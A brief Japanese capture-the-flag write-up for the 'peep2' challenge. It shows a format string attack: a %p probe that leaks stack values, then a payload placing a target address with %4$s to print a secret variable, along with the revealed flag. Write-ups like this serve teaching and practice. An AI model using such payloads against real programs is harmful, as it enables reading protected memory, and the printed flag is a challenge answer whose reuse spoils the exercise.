# peep2
format string attackで覗き見る。

```bash=
$ python -c 'import sys;sys.stdout.buffer.write(b"AAAA" + b",%p"*32)' | ./peep2
AAAA,0x80,0xf7f625c0,0x80484bf,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,(nil),0xffc59cdc,0x804857b,0x1secret address: 0x804a040
```

引数はstackの4番目に積まれることがわかります。
したがって, stackの4番目にsecret変数のアドレスを埋め込み, それを参照することでsecret変数のアドレスを表示させます。

```bash=
$ echo -e '\x40\xa0\x04\x08%4$s' | ./peep2 
@�taskctf{1t's_f0rm@_str1ng_4tt4ck!!}
secret address: 0x804a040
```
